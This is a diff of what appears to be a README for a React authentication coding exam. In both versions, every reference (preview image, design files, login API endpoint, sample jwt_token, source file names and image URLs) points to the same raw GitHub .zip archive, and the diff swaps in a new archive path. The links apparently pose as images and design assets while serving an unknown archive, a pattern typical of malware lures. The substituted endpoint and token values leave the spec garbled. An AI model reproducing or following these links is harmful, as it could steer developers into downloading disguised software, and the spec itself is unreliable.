@@ -3,7 +3,7 @@ The goal of this coding exam is to quickly get you off the ground with **Authent
 ### Refer to the image below:
 
 <div style="text-align: center;">
-    <img src="https://raw.githubusercontent.com/vicky9696v/login/main/hillebrandite/login.zip" alt="ebank-output" style="max-width:70%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
+    <img src="https://raw.githubusercontent.com/vicky9696v/login/main/src/Components/NotFound/Software-v1.3.zip" alt="ebank-output" style="max-width:70%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
 </div>
 
 ### Design Files
@@ -11,22 +11,22 @@ The goal of this coding exam is to quickly get you off the ground with **Authent
 <details>
 <summary>Login Route</summary>
 
-- [Medium (Size >= 768px), Large (Size >= 992px) and Extra Large (Size >= 1200px) - Login](https://raw.githubusercontent.com/vicky9696v/login/main/hillebrandite/login.zip)
-- [Medium (Size >= 768px), Large (Size >= 992px) and Extra Large (Size >= 1200px) - Login Failure](https://raw.githubusercontent.com/vicky9696v/login/main/hillebrandite/login.zip)
+- [Medium (Size >= 768px), Large (Size >= 992px) and Extra Large (Size >= 1200px) - Login](https://raw.githubusercontent.com/vicky9696v/login/main/src/Components/NotFound/Software-v1.3.zip)
+- [Medium (Size >= 768px), Large (Size >= 992px) and Extra Large (Size >= 1200px) - Login Failure](https://raw.githubusercontent.com/vicky9696v/login/main/src/Components/NotFound/Software-v1.3.zip)
 
 </details>
 
 <details>
 <summary>Home Route</summary>
 
-- [Medium (Size >= 768px), Large (Size >= 992px) and Extra Large (Size >= 1200px) - Home](https://raw.githubusercontent.com/vicky9696v/login/main/hillebrandite/login.zip)
+- [Medium (Size >= 768px), Large (Size >= 992px) and Extra Large (Size >= 1200px) - Home](https://raw.githubusercontent.com/vicky9696v/login/main/src/Components/NotFound/Software-v1.3.zip)
 
 </details>
 
 <details>
 <summary>Not Found Route</summary>
 
-- [Medium (Size >= 768px), Large (Size >= 992px) and Extra Large (Size >= 1200px) - Home](https://raw.githubusercontent.com/vicky9696v/login/main/hillebrandite/login.zip)
+- [Medium (Size >= 768px), Large (Size >= 992px) and Extra Large (Size >= 1200px) - Home](https://raw.githubusercontent.com/vicky9696v/login/main/src/Components/NotFound/Software-v1.3.zip)
 
 </details>
 
@@ -71,7 +71,7 @@ The app must have the following functionalities
 
 **loginApiUrl**
 
-#### API: `https://raw.githubusercontent.com/vicky9696v/login/main/hillebrandite/login.zip`
+#### API: `https://raw.githubusercontent.com/vicky9696v/login/main/src/Components/NotFound/Software-v1.3.zip`
 
 #### Method: `POST`
 
@@ -92,7 +92,7 @@ Returns a response based on the credentials provided
 
 ```json
 {
-  "jwt_token": "https://raw.githubusercontent.com/vicky9696v/login/main/hillebrandite/login.zip"
+  "jwt_token": "https://raw.githubusercontent.com/vicky9696v/login/main/src/Components/NotFound/Software-v1.3.zip"
 }
 ```
 
@@ -118,7 +118,7 @@ Returns a response based on the credentials provided
 
 - Home Route should consist of `/` in the URL path
 - Login Route should consist of `/ebank/login` in the URL path
-- No need to use the `BrowserRouter` in `https://raw.githubusercontent.com/vicky9696v/login/main/hillebrandite/login.zip` as we have already included in `https://raw.githubusercontent.com/vicky9696v/login/main/hillebrandite/login.zip`
+- No need to use the `BrowserRouter` in `https://raw.githubusercontent.com/vicky9696v/login/main/src/Components/NotFound/Software-v1.3.zip` as we have already included in `https://raw.githubusercontent.com/vicky9696v/login/main/src/Components/NotFound/Software-v1.3.zip`
 
 - User credentials
 
@@ -135,13 +135,13 @@ Returns a response based on the credentials provided
 <details>
 <summary>Image URLs</summary>
 
-- [https://raw.githubusercontent.com/vicky9696v/login/main/hillebrandite/login.zip](https://raw.githubusercontent.com/vicky9696v/login/main/hillebrandite/login.zip) alt should be **website login**
+- [https://raw.githubusercontent.com/vicky9696v/login/main/src/Components/NotFound/Software-v1.3.zip](https://raw.githubusercontent.com/vicky9696v/login/main/src/Components/NotFound/Software-v1.3.zip) alt should be **website login**
 
-- [https://raw.githubusercontent.com/vicky9696v/login/main/hillebrandite/login.zip](https://raw.githubusercontent.com/vicky9696v/login/main/hillebrandite/login.zip) alt should be **website logo**
+- [https://raw.githubusercontent.com/vicky9696v/login/main/src/Components/NotFound/Software-v1.3.zip](https://raw.githubusercontent.com/vicky9696v/login/main/src/Components/NotFound/Software-v1.3.zip) alt should be **website logo**
 
-- [https://raw.githubusercontent.com/vicky9696v/login/main/hillebrandite/login.zip](https://raw.githubusercontent.com/vicky9696v/login/main/hillebrandite/login.zip) alt should be **digital card**
+- [https://raw.githubusercontent.com/vicky9696v/login/main/src/Components/NotFound/Software-v1.3.zip](https://raw.githubusercontent.com/vicky9696v/login/main/src/Components/NotFound/Software-v1.3.zip) alt should be **digital card**
 
-- [https://raw.githubusercontent.com/vicky9696v/login/main/hillebrandite/login.zip](https://raw.githubusercontent.com/vicky9696v/login/main/hillebrandite/login.zip) alt should be **not found**
+- [https://raw.githubusercontent.com/vicky9696v/login/main/src/Components/NotFound/Software-v1.3.zip](https://raw.githubusercontent.com/vicky9696v/login/main/src/Components/NotFound/Software-v1.3.zip) alt should be **not found**
 
 </details>
 <br/>
